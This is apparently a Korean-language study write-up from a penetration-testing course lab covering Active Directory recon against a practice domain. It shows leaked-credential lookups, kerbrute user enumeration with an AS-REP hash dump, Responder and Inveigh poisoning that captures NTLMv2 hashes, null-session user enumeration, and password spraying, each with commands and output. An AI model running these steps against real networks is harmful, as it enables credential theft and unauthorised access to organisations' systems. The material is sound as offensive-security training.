---
title: "Active Directory - Initial Enumeration and Foothold"
date: 2026-08-02
layout: single
excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
---

# Initial Enumeration

## External Recon and Enumeration Principles

초반에 접근을 하기 위해 도메인 열거는 필수이다.

[Hurricane Electric](https://bgp.he.net/) 와 같은 사이트나, [](https://viewdns.info/) 사이트를 이용하여 도메인의 열거를 수행하는데 도움이 된다.

도메인에 각각 txt, 도메인의 ip, 각 연결된 하위 도메인 정보들이 들어있을수도 있기 때문이다.

만약 inlanefreight.com 도메인을 검색한다고 가정해보자.

그렇다면 구글을 통하여 "filetype:pdf inurl:inlanefreight.com" 식으로 구글의 세부 명령을 통하여 열거를 진행할수도 잇으며

또한 [](https://dehashed.com/) 도구를 사용하여 유출된 데이터에서 평문 자격 증명과 암호 해시를 찾는 데 열거를 진행할수도있다:

```bash
$ sudo python3 dehashed.py -q inlanefreight.local -p

id : 5996447501
email : roger.grimes@inlanefreight.local
username : rgrimes
password : Ilovefishing!
hashed_password : 
name : Roger Grimes
vin : 
address : 
phone : 
database_name : ModBSolutions

id : 7344467234
email : jane.yu@inlanefreight.local
username : jyu
password : Starlight1982_!
hashed_password : 
name : Jane Yu
vin : 
address : 
phone : 
database_name : MyFitnessPal

## SKIP
```

## Initial Enumeration of the Domain

현재 침투테스트에서 얻은 정보는 다음과 같다:

- Scope: 172.16.5.0/23
- 내부망에 배치된 Linux pentest VM
- 필요하면 사용할 Windows attack host
- Windows attack host 접속용 htb-student 계정
- Grey Box
- Non-Evasive

따라서 htb-student 계정으로 들어가 듀얼 홈드 환경에서의 사용자 열거나 시스템에 접근할수 있는 권한을 찾아야한다.

ifconfig 를 보면 이처럼 현재 호스트에 172.16.5.0/23 호스트가 붙은걸 확인할수있따:

```bash
$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.107.119  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::f31f:d435:be9c:3304  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::9ee8:fa6e:21a:cca8  prefixlen 64  scopeid 0x0<global>
        ether a2:de:ad:79:95:b2  txqueuelen 1000  (Ethernet)
        RX packets 535  bytes 44695 (43.6 KiB)
        RX errors 0  dropped 24  overruns 0  frame 0
        TX packets 83  bytes 11492 (11.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:d1:d6:7f  txqueuelen 1000  (Ethernet)
        RX packets 424  bytes 35914 (35.0 KiB)
        RX errors 0  dropped 9  overruns 0  frame 0
        TX packets 32  bytes 2370 (2.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

이처럼 현재 다른 홉의 연결되어 게이트웨이를 통해 통신하는 호스트 들이 아닌

듀얼 홈드로 연결되어있는 환경이기에 tcpdump, wireshark 와 같은 통신 패킷 흐름을 캡쳐하는 도구를 활용하여 ens224의 흐름을 확인할수있게된다.

또한 `172.16.5.0/23` 처럼 현재 광범위한 스코프이기에 fping 명령을 통하여 각각 어떤 호스트가 존재하는지를 확인할수 있다:

```bash
$ fping -asgq 172.16.4.0/23   

172.16.5.5
172.16.5.130
172.16.5.225
```

또한 각각 출력된 호스트를 토대로 txt 파일을 만들어 각 nmap에 끼어넣을수있게된다:

```bash
$ sudo nmap -sC -sV -iL hosts.txt | tee nmap                                                                   

PORT     STATE SERVICE       VERSION

# SKIP
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-02 05:24:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2026-07-21T08:46:17
|_Not valid after:  2027-01-20T08:46:17
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-02T05:25:23+00:00
MAC Address: A2:DE:AD:32:D1:73 (Unknown)
Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-02T05:25:23
|_  start_date: N/A
|_clock-skew: mean: 19s, deviation: 0s, median: 19s
|_nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:32:d1:73 (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Nmap scan report for 172.16.5.130
# SKIP
```

이처럼 현재 172 안에서도 각각 다른 서버들이며, 특히 172.16.5.5 포트에선 AD를 사용하는 서버임을 알수있게된다.

이를 통하여 [kerbrute](https://github.com/ropnop/kerbrute) 를 통하여 사용자 열거를 진행할수있따:

```bash
$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt

2026/08/02 01:35:58 >  Using KDC(s):
2026/08/02 01:35:58 >   172.16.5.5:88

2026/08/02 01:35:58 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       jwilson@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       bdavis@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       njohnson@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       asanchez@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       dlewis@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       ccruz@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:366b80789ff06d382993e4766a0f2c84$8340ed04d3482944a093d351d8069192651a06c79811b85304b6b8949aba077e6428d0da32c81fdd38054db3a0e41bfea7210fb89f180cbd6b02f542517c75fa49e6d650cd9687a62126f7ada9706b4e019a9355bae2a84ce308375eafd53e110390db67381eb34c3e47ed45697624ec230b890062552fbdeefb8a432c3476753d3d0b0c99f7c008bd7e2d1446c6441d6d50c1ff837a4148a5f000ac26e0340ae43c011fa2e766a267ac1a149661dc7212d570d8cbf48ca3e2d963e03014c4582719504d863c41b80757736b60a8540d1866c70768afdc75654872966f871628d3c260b9fa98230edf49920f6cb71368a707e6d0408a2fe98f543488068fc8dde1d0aae45d2290c3a518
2026/08/02 01:35:58 >  [+] VALID USERNAME:       mmorgan@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       rramirez@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       jwallace@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       jsantiago@INLANEFREIGHT.LOCAL
```

이제 이 결과를 바탕으로 표적 암호 무차별 대입 공격에 사용할 목록을 만들 수 있습니다.

# Sniffing out a Foothold

## LLMNR/NBT-NS Poisoning - from Linux

라우팅을 안거치고 네트워크 안의 랜에 같이 존재하기에 responder 툴을 이용하여 내부 172.16.5의 패킷들을 캡쳐할수 있게된다.

responder툴은 이름 해석 요청을 가로채서 내가 그 서버라고 속이고 상대 인증을 받아내는 툴이다.

따라서 responder를 키게되면 이처럼 각 172.16.5단의 각 서버들이 이름을 찾고 responer는 응답을 수신하며 172.16.5단 서버는 속아서 responder에게 전달하게 되는 구조가 되게된다:

```bash
$ sudo responder -I ens224                                                                                     

[+] Listening for events...                                                                                        

[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:8c91d150859b691a:A70CF89062A865E43F4AAF55B4D0209A:01010000000000004ECBC92FE62ADD01678508CE7C4E0B2600000000020008004D0032004800310001001E00570049004E002D0057004200530032004300330056004E004B0055005000040014004D003200480031002E004C004F00430041004C0003003400570049004E002D0057004200530032004300330056004E004B00550050002E004D003200480031002E004C004F00430041004C00050014004D003200480031002E004C004F00430041004C000800300030000000000000000000000000300000DECFE5882AAA3D0E9CB0F305131DA75C12513B952F999AD8C47C62CEECC87B330A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000
```

이처럼 mssql 서버로 들어가려던 사람이 academy-ea-web0:1433 MSSQL에 접속해야지 하다가 responder에게 속아 위처럼 lab_adm의 자격증명이 나타난것을 확인할수있따.

또한 찍히진 않았지만 `wley` 도 발견되어 계정 비번을 크랙하여 이처럼 내부에 사용할수있게된다:

```bash
$ crackmapexec smb 172.16.5.0/24 -u wley -p 'transporter@4'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4
```

접속할수있따:

```bash
$ smbclient -L //172.16.5.5 -U 'INLANEFREIGHT.LOCAL\wley%transporter@4'                                        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        User Shares     Disk      
        ZZZ_archive     Disk      
```

## LLMNR/NBT-NS Poisoning - from Windows

윈도우의 사용법은 이러하다.

우선 내부 네트워크 구조를 보니 이러하다:

```powershell
*Evil-WinRM* PS C:\Users\htb-student\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::490d:6d78:9f71:ede7%8
   IPv4 Address. . . . . . . . . . . : 172.16.5.25
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::be:d4df:7a92:2fe
   Link-local IPv6 Address . . . . . : fe80::be:d4df:7a92:2fe%12
   IPv4 Address. . . . . . . . . . . : 10.129.107.144
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:4ced%12
                                       10.129.0.1
```

이처럼 윈도우 환경에도 리눅스 환경이랑 비슷하게 되어있다.

윈도우에선 리눅스의 리스폰더와 비슷한 C# Inveigh 도구가 존재한다.

쓰면 이렇게된다:

```powershell
*Evil-WinRM* PS C:\tools> .\Inveigh.exe

# SKIP

[.] [00:04:57] SMB1(445) negotiation request detected from 172.16.5.130:49983
[.] [00:04:57] SMB2+(445) negotiation request detected from 172.16.5.130:49983
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from fe80::9928:5dd5:3fd6:98c1%8 [type ignored]
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from fe80::9928:5dd5:3fd6:98c1%8 [type ignored]
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
[+] [00:04:57] SMB(445) NTLM challenge [E2F1B67656CD23A8] sent to 172.16.5.25:49983
[+] [00:04:57] SMB(445) NTLMv2 captured for [INLANEFREIGHT\lab_adm] from 172.16.5.130(ACADEMY-EA-FILE):49983:
lab_adm::INLANEFREIGHT:E2F1B67656CD23A8:E3D4D4E0A0EB96CE5B1C330AB0E637A1:01010000000000001D39010DF22ADD01FB3AF0502925BFB90000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001D39010DF22ADD0106000400020000000800300030000000000000000000000000300000345E64B92F0BAD3BB5C7F2D001EFF7D6094A9BB17BDEEFD13F6446B0C1DED0CD0A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
```

이처럼 나오게된다.

# Sighting In, Hunting For A User

## Enumerating & Retrieving Password Policies

### Linux

우선 패스워드 스프레이를 하기전 상대 서버의 패스워드 정책을 훑어보는것이 좋다.

그래야 거기에 맞춰서 패스워드 스프레이를 진행할수가 있기 때문이다.

nxc를 활용하여 볼수가 있다:

```bash
$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol                                            

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHT
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not Set
SMB         172.16.5.5      445    ACADEMY-EA-DC01  
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Refuse Password Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Store Cleartext: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Lockout Admins: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password No Clear Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password No Anon Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Complex: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set
```

이처럼 5번에 실패하면 30분간 계쩡 로그인이 불가능하고, 최소 비밀번호가 8자임을 확인할수있고

또한 이전에 사용했던 비밀번호 24개를 기억하고 그 24개 내에 비밀번호 재사용을 금지하고있다.

또한 rpc를 활용하여도 어떤 도메인지와, 유저수가 몇마리인지, 비밀번호 정책을 가져올수가있다:

```bash
rpcclient $> querydominfo

Domain:     INLANEFREIGHT
Server:     
Comment:    
Total Users:    3650
Total Groups:   0
Total Aliases:  37
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:  0x1

rpcclient $> getdompwinfo

min_password_length: 8
password_properties: 0x00000001
    DOMAIN_PASSWORD_COMPLEX
```

그리고 [](https://github.com/cddmp/enum4linux-ng)를 이용하여 가져올수도있다:

```bash
$ enum4linux-ng -P 172.16.5.5 -oA ilfreight                                                                    

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 172.16.5.5
[*] Username ......... ''
[*] Random Username .. 'pdthnpmy'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==================================
|    Service Scan on 172.16.5.5    |
 ==================================
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =======================================
|    SMB Dialect Check on 172.16.5.5    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: false                                                                                                     
SMB 2.02: true                                                                                                     
SMB 2.1: true                                                                                                      
SMB 3.0: true                                                                                                      
SMB1 only: false                                                                                                   
Preferred dialect: SMB 3.0                                                                                         
SMB signing required: true                                                                                         

 =======================================
|    RPC Session Check on 172.16.5.5    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =================================================
|    Domain Information via RPC for 172.16.5.5    |
 =================================================
[+] Domain: INLANEFREIGHT
[+] SID: S-1-5-21-3842939050-3880317879-2865463114
[+] Host is part of a domain (not a workgroup)

 =========================================================
|    Domain Information via SMB session for 172.16.5.5    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ACADEMY-EA-DC01                                                                             
NetBIOS domain name: INLANEFREIGHT                                                                                 
DNS domain: INLANEFREIGHT.LOCAL                                                                                    
FQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL                                                                          

 =======================================
|    Policies via RPC for 172.16.5.5    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:                                                                                       
  pw_history_length: 24                                                                                            
  min_pw_length: 8                                                                                                 
  min_pw_age: 1 day 4 minutes                                                                                      
  max_pw_age: not set                                                                                              
  pw_properties:                                                                                                   
  - DOMAIN_PASSWORD_COMPLEX: true                                                                                  
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                                                          
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                                                         
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                                                          
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                                                
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                                                  
domain_lockout_information:                                                                                        
  lockout_observation_window: 30 minutes                                                                           
  lockout_duration: 30 minutes                                                                                     
  lockout_threshold: 5                                                                                             
domain_logoff_information:                                                                                         
  force_logoff_time: not set 
```

이처럼 내부에 어떤 도메인이 존재하는지와, 어떤 DC01 이름을 사용하는지, 또한 RPC의 널 세션이허용되는지 추가로 비밀번호 정책까지 가져올수 있게된다.

또한 LADPSEARCH를 통하여 가져올수있다:

```bash
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength   

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
```

### Window

윈도우 환경에선 `net.exe` 를 사용하여 비밀번호 정책을 가져올수있다:

```powershell
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

그리고 [powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)를 통해서도 가져올수도 있다:

```powershell
PS C:\htb> import-module .\PowerView.ps1

PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

## Password Spraying - Making a Target User List

패스워드 스프레이를 하기 전, 어떤 유저들이 존재하는지 확인해할 필요가 있다.

우선 enillinux 툴을 활용하여 이렇게 유저들을 가져올수있따:

```bash
$ enum4linux-ng -U 172.16.5.5 | grep "username:" | awk '{print $2}'   

lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
# SKIP
```

그리고 NULL 세션을 이용한 RPC로도 가져올수있다:

```bash
$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
# SKIP
```

또한 익명으로 ldapsearch를 활용하여 가져올수도 있다:

```bash
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
htb-student
avazquez
pfalcon
fanthony
wdillard
# SKIP
```

# Spray Responsibly

## Internal Password Spraying - from Linux

만약 이제 초기에 wely 계정인 transporter@4 라는 계정이 있었다.

만약 그 계정에서 wely 유저의 계정인지 모르는 상태에서 어떠한 파일중 Password:transporter@4 라는게 적혀있었다고 가정해보자.

우선 방금의 방식을 활용하여 User를 txt 파일로 저장하였다:

```bash
$ enum4linux-ng -U 172.16.5.5 | grep "username:" | awk '{print $2}' > users.txt
```

이제 이 상태에서 `transporter@4` 라는 정보를 이용하여 패스워드 스프레이를 조져볼것이다.

따라서 내부에 이렇게작성하였다:

```bash
$ crackmapexec smb 172.16.5.0/23 -u users.txt -p 'transporter@4'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [-] INLANEFREIGHT.LOCAL\tjohnson:transporter@4 STATUS_LOGON_FAILURE 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [-] INLANEFREIGHT.LOCAL\bross:transporter@4 STATUS_LOGON_FAILURE 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [-] INLANEFREIGHT.LOCAL\jhermann:transporter@4 STATUS_LOGON_FAILURE 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 
```

그렇다면 이처럼 `wley:transporter@4 ` 가뜨며 패스워드 스프레이에 성공하게된다.

또한 저 계정이 wley 만 아닌 다른 유저들도 사용할수가 있기에 저기에만 그치지말고 쭉 열거해보는게 좋다.

그리고 방금봤던 패스워드 정책에 따라서 

## Internal Password Spraying - from Windows

윈도우도 똑같다. 

윈도우에는 [passwordspary](https://github.com/dafthack/DomainPasswordSpray) 라는 툴이 존재한다.

따라서 위 툴을 활용하여 패스워드 스프레이가 가능하다:

```bash
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# SKIP

[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1
```